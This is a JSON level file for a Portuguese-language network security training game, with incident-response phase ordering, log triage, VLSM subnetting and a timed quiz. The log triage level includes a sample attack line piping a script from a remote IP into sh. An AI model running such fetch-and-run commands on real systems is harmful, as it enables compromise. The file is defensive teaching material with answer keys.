@@ -1,0 +1,506 @@
+{
+  "tag": "ATO 4",
+  "name": "Resposta a incidente",
+  "levels": [
+    {
+      "title": "Plano de resposta",
+      "tag": "ORDENAÇÃO",
+      "type": "drop",
+      "mode": "slots",
+      "wide": true,
+      "loc": "desk",
+      "cap": "Abrindo o plano de resposta a incidente...",
+      "goal": "Monte as fases de resposta a incidente na ordem do NIST SP 800-61.",
+      "intro": "Um servidor foi comprometido. A diretoria quer saber o plano. Ordene as fases de <b>resposta a incidente</b>.",
+      "z": "Já estou dentro. Vai fazer o quê, desligar tudo no desespero?",
+      "me": "Não. Vou seguir o processo, passo a passo.",
+      "lesson": [
+        "O <b>NIST SP 800-61</b> é a referência mais usada de resposta a incidentes. Ele divide o trabalho em fases, cada uma com um objetivo.",
+        "<b>Preparação</b> acontece antes do incidente: runbooks, backups testados, lista de contatos. <b>Detecção e análise</b> confirma o que aconteceu e o tamanho do estrago.",
+        "<b>Contenção</b> estanca o problema (isolar a máquina, bloquear o C2). <b>Erradicação</b> remove a causa (backdoor, contas, malware). <b>Recuperação</b> volta à produção sob monitoramento.",
+        "<b>Lições aprendidas</b> fecham o ciclo: o que falhou e o que muda para não se repetir.",
+        "No documento (revisão 2), contenção, erradicação e recuperação formam uma fase só, mas na prática seguem essa ordem."
+      ],
+      "tip": "Primeiro se prepara, depois detecta. Isolar vem antes de limpar, e limpar vem antes de voltar pra produção. Aprender fica no final.",
+      "learn": "Ciclo do NIST: preparação, detecção e análise, contenção, erradicação, recuperação e atividades pós-incidente. Formatar sem análise destrói evidência e não diz por onde o invasor entrou, então ele volta.",
+      "html": "<div class=\"ord\"><span class=\"n\">1</span>[s1]</div><div class=\"ord\"><span class=\"n\">2</span>[s2]</div><div class=\"ord\"><span class=\"n\">3</span>[s3]</div><div class=\"ord\"><span class=\"n\">4</span>[s4]</div><div class=\"ord\"><span class=\"n\">5</span>[s5]</div><div class=\"ord\"><span class=\"n\">6</span>[s6]</div>",
+      "zones": {
+        "s1": [
+          "p"
+        ],
+        "s2": [
+          "d"
+        ],
+        "s3": [
+          "c"
+        ],
+        "s4": [
+          "e"
+        ],
+        "s5": [
+          "r"
+        ],
+        "s6": [
+          "l"
+        ]
+      },
+      "explain": {
+        "s1": "Preparação vem antes de tudo: sem runbook e backup, o resto é improviso.",
+        "s2": "Primeiro entender: o que foi atingido, desde quando e por onde.",
+        "s3": "Contenção isola o problema para ele não se espalhar enquanto você trabalha.",
+        "s4": "Com o invasor isolado, remova backdoors, contas criadas e malware.",
+        "s5": "Só depois de limpo o sistema volta à produção, sob monitoramento.",
+        "s6": "O pós-mortem transforma o incidente em melhoria."
+      },
+      "chips": [
+        {
+          "t": "Preparação: runbooks, backups, contatos",
+          "v": "p",
+          "why": "Preparação é feita antes do incidente. É a fase 1."
+        },
+        {
+          "t": "Detecção e análise: logs, alertas, escopo",
+          "v": "d",
+          "why": "Detecção e análise vem logo depois da preparação: confirmar e medir o estrago."
+        },
+        {
+          "t": "Contenção: isolar a VLAN, bloquear o C2",
+          "v": "c",
+          "why": "Contenção vem depois de entender o incidente e antes de limpar."
+        },
+        {
+          "t": "Erradicação: remover backdoor e contas",
+          "v": "e",
+          "why": "Erradicação só depois de conter, senão o invasor volta enquanto você limpa."
+        },
+        {
+          "t": "Recuperação: restaurar e monitorar",
+          "v": "r",
+          "why": "Recuperação vem depois de limpar: voltar à produção com o sistema já seguro."
+        },
+        {
+          "t": "Lições aprendidas: pós-mortem",
+          "v": "l",
+          "why": "Lições aprendidas fecham o ciclo. É a última fase."
+        },
+        {
+          "t": "Formatar tudo sem análise",
+          "v": "x1",
+          "why": "Formatar sem análise destrói a evidência e não mostra por onde o invasor entrou. Ele volta."
+        },
+        {
+          "t": "Pagar o resgate",
+          "v": "x2",
+          "why": "Pagar resgate não garante nada e financia o próximo ataque. Não é fase de resposta."
+        }
+      ]
+    },
+    {
+      "title": "Caça nos logs",
+      "tag": "CAÇADA",
+      "type": "drop",
+      "mode": "buckets",
+      "loc": "server",
+      "cap": "Acessando o servidor comprometido...",
+      "goal": "Separe as linhas de log normais das suspeitas.",
+      "intro": "Você puxou os logs do servidor comprometido. Separe o que é <b>rotina</b> do que é <b>sinal de invasão</b>.",
+      "z": "Escondi meu rastro no meio do barulho. Boa sorte.",
+      "me": "Quem sabe o que é normal acha o anormal.",
+      "lesson": [
+        "Caçar ameaça começa por saber o que é <b>normal</b> no seu ambiente. Suspeito é o que foge desse padrão.",
+        "<b>Força bruta</b>: muitas falhas de login seguidas, do mesmo IP, geralmente tentando root ou admin.",
+        "<b>Download direto para o shell</b> (<b>curl ... | sh</b>) executado pelo usuário do servidor web (<b>www-data</b>) indica que uma aplicação foi explorada.",
+        "<b>Persistência</b>: o invasor cria contas para voltar depois. <b>UID 0</b> é o root, então uma conta nova com UID 0 é um backdoor.",
+        "<b>Cryptojacking</b>: processo com nome disfarçado usando muita CPU e conexões de saída para pools de mineração, em portas como 3333 e 4444."
+      ],
+      "tip": "Procure: força bruta, download direto para shell, usuário novo com UID 0, processo estranho usando CPU e conexões para pools de mineração.",
+      "learn": "Indicadores clássicos de mineração: processo com nome falso (kdevtmpfsi, kinsing) comendo CPU, conexão de saída para portas 3333/4444, e download via curl ou wget direto para sh. UID 0 extra é backdoor de persistência.",
+      "buckets": [
+        {
+          "label": "NORMAL",
+          "c": "#00e0a8",
+          "a": [
+            {
+              "t": "Accepted publickey for noc from 10.99.0.15",
+              "why": "Login por chave, usuário conhecido, vindo da rede de gerência. Rotina."
+            },
+            {
+              "t": "BGP neighbor 200.1.1.1 state Established",
+              "why": "Sessão BGP estabelecida normalmente."
+            },
+            {
+              "t": "systemd: Started Daily apt upgrade",
+              "why": "Atualização automática diária do sistema."
+            },
+            {
+              "t": "DHCP: lease renovado para 10.0.5.23",
+              "why": "Renovação de IP comum dentro da rede interna."
+            }
+          ]
+        },
+        {
+          "label": "SUSPEITO",
+          "c": "#ff4d6d",
+          "a": [
+            {
+              "t": "sshd: Failed password for root from 185.220.101.4 (847x em 2 min)",
+              "why": "Centenas de senhas erradas para root em poucos minutos: força bruta."
+            },
+            {
+              "t": "processo 'kdevtmpfsi' usando 390% de CPU",
+              "why": "kdevtmpfsi é um minerador conhecido, com nome disfarçado de processo do kernel."
+            },
+            {
+              "t": "www-data executou: curl http://45.9.148.99/x.sh | sh",
+              "why": "O usuário do servidor web baixando e executando script: a aplicação foi explorada."
+            },
+            {
+              "t": "useradd: novo usuário 'sysupdate' com UID 0",
+              "why": "UID 0 é root. Conta nova com nome inocente é backdoor de persistência."
+            },
+            {
+              "t": "conexão de saída para 91.x.x.x:3333 (pool)",
+              "why": "A porta 3333 é típica de pool de mineração (protocolo Stratum)."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "title": "Reconstruir a rede",
+      "tag": "VLSM",
+      "type": "drop",
+      "mode": "slots",
+      "loc": "desk",
+      "cap": "Reconstruindo o endereçamento...",
+      "goal": "Reenderece a rede limpa com VLSM, do maior para o menor.",
+      "intro": "Rede limpa, hora de reconstruir. Bloco <b>10.50.0.0/24</b>. Aloque com <b>VLSM do maior para o menor</b>, sem desperdício.",
+      "z": "Mesmo que você limpe tudo, não vai conseguir reendereçar a tempo.",
+      "me": "VLSM, do maior pro menor. Sem sobrar buraco.",
+      "lesson": [
+        "<b>VLSM</b> é usar máscaras de tamanhos diferentes dentro do mesmo bloco, dando a cada rede só o tamanho que ela precisa.",
+        "Escolha o prefixo pelo número de hosts: a menor rede em que <b>2^n − 2 ≥ hosts</b>. /25 = 126, /26 = 62, /27 = 30, /28 = 14, /29 = 6, /30 = 2.",
+        "Aloque <b>do maior para o menor</b>. Cada rede começa logo depois do fim da anterior, e esse início sempre cai numa fronteira do tamanho dela.",
+        "Um link ponto a ponto entre dois roteadores só precisa de 2 IPs úteis: <b>/30</b> (ou /31, nos equipamentos que suportam)."
+      ],
+      "tip": "100 hosts cabem numa /25 (126). 50 numa /26 (62). 20 numa /27 (30). Link ponto a ponto de 2 hosts numa /30. Cada rede começa onde a anterior terminou.",
+      "learn": "Vendas 10.50.0.0/25 (0-127), TI 10.50.0.128/26 (128-191), Diretoria 10.50.0.192/27 (192-223), Link 10.50.0.224/30 (224-227). Alocar do maior para o menor evita sobreposição e buracos.",
+      "html": "<div class=\"grid3\"><div class=\"h\">SETOR</div><div class=\"h\">REDE 10.50.0.x</div><div class=\"h\">PREFIXO</div>\n<div>Vendas<br><small style=\"color:var(--muted)\">100 hosts</small></div>[v1][v2]\n<div>TI<br><small style=\"color:var(--muted)\">50 hosts</small></div>[t1][t2]\n<div>Diretoria<br><small style=\"color:var(--muted)\">20 hosts</small></div>[d1][d2]\n<div>Link P2P<br><small style=\"color:var(--muted)\">2 hosts</small></div>[l1][l2]</div>",
+      "zones": {
+        "v1": [
+          ".0"
+        ],
+        "v2": [
+          "/25"
+        ],
+        "t1": [
+          ".128"
+        ],
+        "t2": [
+          "/26"
+        ],
+        "d1": [
+          ".192"
+        ],
+        "d2": [
+          "/27"
+        ],
+        "l1": [
+          ".224"
+        ],
+        "l2": [
+          "/30"
+        ]
+      },
+      "explain": {
+        "v1": "A maior rede vem primeiro, no início do bloco: .0.",
+        "v2": "100 hosts: a /26 dá só 62 e a /25 dá 126. Fica /25 (.0 a .127).",
+        "t1": "A /25 de Vendas termina em .127, então TI começa em .128.",
+        "t2": "50 hosts cabem numa /26 (62 úteis): .128 a .191.",
+        "d1": "TI termina em .191, então a Diretoria começa em .192.",
+        "d2": "20 hosts: a /28 dá só 14 e a /27 dá 30. Fica /27 (.192 a .223).",
+        "l1": "A Diretoria termina em .223, então o link começa em .224.",
+        "l2": "2 hosts: a /30 tem 4 endereços e 2 úteis. Exato para ponto a ponto."
+      },
+      "chips": [
+        {
+          "t": ".0",
+          "why": ".0 é o início do bloco: vai para a maior rede, Vendas."
+        },
+        {
+          "t": ".128",
+          "why": ".128 é o primeiro endereço livre depois de uma /25 que começa em .0."
+        },
+        {
+          "t": ".192",
+          "why": ".192 é o primeiro endereço livre depois de .128/26."
+        },
+        {
+          "t": ".224",
+          "why": ".224 é o primeiro endereço livre depois de .192/27."
+        },
+        {
+          "t": ".100",
+          "why": "Uma rede não começa em .100: o início precisa ser múltiplo do tamanho do bloco."
+        },
+        {
+          "t": ".200",
+          "why": ".200 não é fronteira de /27 (múltiplos de 32) nem de /26 (múltiplos de 64)."
+        },
+        {
+          "t": ".240",
+          "why": ".240 é fronteira de /28, mas depois de .192/27 o próximo endereço livre é .224."
+        },
+        {
+          "t": "/25",
+          "why": "/25 tem 126 hosts úteis."
+        },
+        {
+          "t": "/26",
+          "why": "/26 tem 62 hosts úteis."
+        },
+        {
+          "t": "/27",
+          "why": "/27 tem 30 hosts úteis."
+        },
+        {
+          "t": "/30",
+          "why": "/30 tem 2 hosts úteis, ideal para ponto a ponto."
+        },
+        {
+          "t": "/24",
+          "why": "/24 é o bloco inteiro. Não sobraria nada para os outros setores."
+        },
+        {
+          "t": "/28",
+          "why": "/28 tem 14 hosts úteis: pouco para a Diretoria e demais para o link."
+        },
+        {
+          "t": "/29",
+          "why": "/29 tem 6 hosts úteis: desperdiça 4 IPs num link de 2."
+        }
+      ]
+    },
+    {
+      "title": "Confronto: Z3R0",
+      "tag": "CHEFE FINAL",
+      "type": "quiz",
+      "boss": true,
+      "time": 15,
+      "loc": "war",
+      "cap": "Z3R0 invadiu o telão do NOC!",
+      "goal": "Z3R0 está ao vivo no seu terminal. Acerte 7 perguntas antes que ele derrube a rede. 15 segundos por pergunta.",
+      "z": "Chega de joguinho. Eu contra você, ao vivo. Cada erro seu e eu derrubo mais um POP.",
+      "me": "Pode vir. Eu conheço essa rede melhor que você.",
+      "lesson": [
+        "Revisão geral de tudo o que você viu: sub-redes, wildcard, portas, TCP, modelo OSI, faixas reservadas, ARP e NDP, e boas práticas.",
+        "Você precisa de <b>7 acertos</b> em 10 perguntas, com <b>15 segundos</b> cada. O relógio para enquanto você lê a explicação.",
+        "Cada erro ou tempo esgotado custa <b>20%</b> de integridade da rede."
+      ],
+      "tip": "Cada acerto tira um pedaço da vida do Z3R0. Cada erro ou tempo esgotado tira 20% da sua integridade.",
+      "learn": "Z3R0 foi rastreado, o C2 caiu e os IPs estão em blackhole. A rede está de pé porque o plantão sabia o básico muito bem: física, endereçamento, firewall e processo.",
+      "qs": [
+        {
+          "q": "Quantos hosts úteis tem uma /27?",
+          "o": [
+            "30",
+            {
+              "t": "32",
+              "why": "32 é o total de endereços. Tire a rede e o broadcast."
+            },
+            {
+              "t": "14",
+              "why": "14 hosts úteis é uma /28."
+            },
+            {
+              "t": "62",
+              "why": "62 hosts úteis é uma /26."
+            }
+          ],
+          "a": 0,
+          "why": "2^5 = 32 endereços, menos rede e broadcast: 30."
+        },
+        {
+          "q": "Qual a wildcard de uma /22?",
+          "o": [
+            "0.0.3.255",
+            {
+              "t": "255.255.252.0",
+              "why": "Essa é a máscara, não a wildcard."
+            },
+            {
+              "t": "0.0.1.255",
+              "why": "0.0.1.255 é a wildcard de uma /23."
+            },
+            {
+              "t": "0.0.7.255",
+              "why": "0.0.7.255 é a wildcard de uma /21."
+            }
+          ],
+          "a": 0,
+          "why": "Máscara 255.255.252.0 invertida: 0.0.3.255."
+        },
+        {
+          "q": "O BGP estabelece sessão em qual porta?",
+          "o": [
+            "TCP 179",
+            {
+              "t": "UDP 179",
+              "why": "O BGP precisa de entrega confiável, por isso usa TCP."
+            },
+            {
+              "t": "TCP 161",
+              "why": "161 é SNMP, e em UDP."
+            },
+            {
+              "t": "UDP 520",
+              "why": "UDP 520 é o RIP."
+            }
+          ],
+          "a": 0,
+          "why": "BGP roda sobre TCP 179. UDP 520 é o RIP."
+        },
+        {
+          "q": "Qual flag TCP inicia uma conexão?",
+          "o": [
+            "SYN",
+            {
+              "t": "ACK",
+              "why": "ACK confirma o recebimento. Sozinho, é o terceiro passo do handshake."
+            },
+            {
+              "t": "FIN",
+              "why": "FIN encerra a conexão de forma educada."
+            },
+            {
+              "t": "RST",
+              "why": "RST derruba a conexão na hora."
+            }
+          ],
+          "a": 0,
+          "why": "Handshake: SYN, SYN-ACK, ACK."
+        },
+        {
+          "q": "Um switch L2 encaminha quadros em qual camada OSI?",
+          "o": [
+            "Enlace (2)",
+            {
+              "t": "Rede (3)",
+              "why": "Camada 3 é roteamento por IP: roteador ou switch L3."
+            },
+            {
+              "t": "Física (1)",
+              "why": "Camada 1 só transmite bits. Cabo e hub ficam aqui."
+            },
+            {
+              "t": "Transporte (4)",
+              "why": "Camada 4 é TCP e UDP, com as portas."
+            }
+          ],
+          "a": 0,
+          "why": "Switch L2 decide por endereço MAC, camada de enlace."
+        },
+        {
+          "q": "Qual é a faixa reservada para CGNAT?",
+          "o": [
+            "100.64.0.0/10",
+            {
+              "t": "172.16.0.0/12",
+              "why": "172.16.0.0/12 é faixa privada da RFC 1918."
+            },
+            {
+              "t": "100.0.0.0/8",
+              "why": "Só o trecho de 100.64 a 100.127 é CGNAT. O resto de 100.x é público."
+            },
+            {
+              "t": "169.254.0.0/16",
+              "why": "169.254 é link-local: o IP que o host se dá quando não encontra DHCP."
+            }
+          ],
+          "a": 0,
+          "why": "RFC 6598: 100.64.0.0/10. A 169.254 é link-local."
+        },
+        {
+          "q": "Qual protocolo descobre o MAC a partir do IP no IPv4?",
+          "o": [
+            "ARP",
+            {
+              "t": "DNS",
+              "why": "DNS traduz nome em IP, não IP em MAC."
+            },
+            {
+              "t": "DHCP",
+              "why": "DHCP entrega o IP ao host."
+            },
+            {
+              "t": "ICMP",
+              "why": "ICMP serve para diagnóstico e erros (ping, destino inalcançável)."
+            }
+          ],
+          "a": 0,
+          "why": "ARP resolve IPv4 para MAC."
+        },
+        {
+          "q": "E no IPv6, quem faz esse papel?",
+          "o": [
+            "NDP (Neighbor Discovery)",
+            {
+              "t": "ARPv6",
+              "why": "Não existe ARPv6. O IPv6 aposentou o ARP."
+            },
+            {
+              "t": "DHCPv6",
+              "why": "DHCPv6 entrega endereço, não resolve MAC."
+            },
+            {
+              "t": "MLD",
+              "why": "MLD gerencia grupos multicast no IPv6, o papel do IGMP no IPv4."
+            }
+          ],
+          "a": 0,
+          "why": "IPv6 usa NDP sobre ICMPv6 (Neighbor Solicitation e Advertisement)."
+        },
+        {
+          "q": "Melhor prática para acesso de gerência aos equipamentos?",
+          "o": [
+            "SSH com chave e ACL restringindo a origem",
+            {
+              "t": "Telnet com senha forte",
+              "why": "Telnet manda tudo em texto puro, inclusive a senha forte."
+            },
+            {
+              "t": "SSH aberto para 0.0.0.0/0 com senha admin",
+              "why": "Aberto para a internet inteira e com senha fraca: alvo certo de força bruta."
+            },
+            {
+              "t": "HTTP com autenticação básica",
+              "why": "Basic auth em HTTP manda a senha só codificada em Base64, sem criptografia."
+            }
+          ],
+          "a": 0,
+          "why": "Criptografia, autenticação forte e superfície de ataque reduzida pela ACL."
+        },
+        {
+          "q": "Qual ataque envenena a tabela ARP para ficar no meio do tráfego?",
+          "o": [
+            "ARP spoofing (MITM)",
+            {
+              "t": "SYN flood",
+              "why": "SYN flood esgota a tabela de conexões. Não mexe em ARP."
+            },
+            {
+              "t": "Amplificação DNS",
+              "why": "Amplificação DNS é ataque volumétrico com resolvers abertos."
+            },
+            {
+              "t": "Smurf",
+              "why": "Smurf é ping para endereço de broadcast com origem forjada."
+            }
+          ],
+          "a": 0,
+          "why": "ARP spoofing. Mitigação: DHCP snooping + Dynamic ARP Inspection."
+        }
+      ]
+    }
+  ]
+}
